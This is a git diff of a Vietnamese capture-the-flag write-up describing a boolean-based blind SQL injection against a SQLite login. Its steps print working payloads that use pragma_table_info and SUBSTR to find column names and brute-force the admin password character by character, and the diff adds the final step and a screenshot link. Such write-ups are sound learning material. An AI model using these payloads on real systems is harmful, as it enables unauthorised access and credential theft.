@@ -73,8 +73,9 @@ Sau khi xác định là boolean SQL Injection bây giờ mình sẽ tiến hàn
   - bước ba xác định số kí tự trong tên column với query sau: SELECT * FROM users WHERE uid = 'admin' AND ((SELECT LENGTH(name) FROM pragma_table_info('users') LIMIT 1 OFFSET 0) > 1) -- tương tự như bước 2 và lặp lại nhưng thay OFFSET bằng 1 để bỏ qua column đầu tiên mới check => tìm ra số kí tự của cả 3 column là 3 kí tự (trong đó 1 column là uid )
   - bước bốn tìm tên column chứa password với query sau : SELECT * FROM users WHERE uid = 'admin' AND (SELECT (SUBSTR((SELECT name FROM pragma_table_info('users') LIMIT 1 OFFSET 1), 1, 1) = 'a') = 1 )-- vì số kí trong tên column là 3 nên mình chỉ cần brute force kí tự thôi có thể dùng intruder trong burp-suite nhưng mình sẽ viết script python để thực hiện nhanh hơn (nghèo không có tìn mua bản pro T_T) script brute-foce_column.py mình có để file các bạn có thể tham khảo chạy xong thì mình được có được tên của 3 colun là idx,uid,upw như hình
  ![image](https://github.com/tthanhnguyen/CTF_cookie-Arena/assets/96458810/f2f2bb6a-1e80-480a-ae6b-9b6badb50842)
-  - bước năm thực hiện brute-force truy vấn mật khẩu của admin thôi nhưng trước hết thì cứ viết query trước đã : SELECT * FROM users WHERE uid = 'admin' AND (SELECT (SUBSTR((SELECT upw FROM users WHERE uid = 'admin'),1,1) = 'a') = 1 ) -- bây giờ giống như bước bốn mình sẽ sửa lại script đã viết trước đó (phần script sửa tên brute-foce_password.py)
-  - 
+  - bước năm thực hiện brute-force truy vấn mật khẩu của admin thôi nhưng trước hết thì cứ viết query trước đã : SELECT * FROM users WHERE uid = 'admin' AND (SELECT (SUBSTR((SELECT upw FROM users WHERE uid = 'admin'),1,1) = 'a') = 1 ) -- bây giờ giống như bước bốn mình sẽ sửa lại script đã viết trước đó (phần script sửa tên brute-foce_password.py) chạy script thì ra liền password nha login là có flag
+![image](https://github.com/tthanhnguyen/CTF_cookie-Arena/assets/96458810/7418e55e-e36c-450b-ad22-6204e06085db)
+
 
 
 
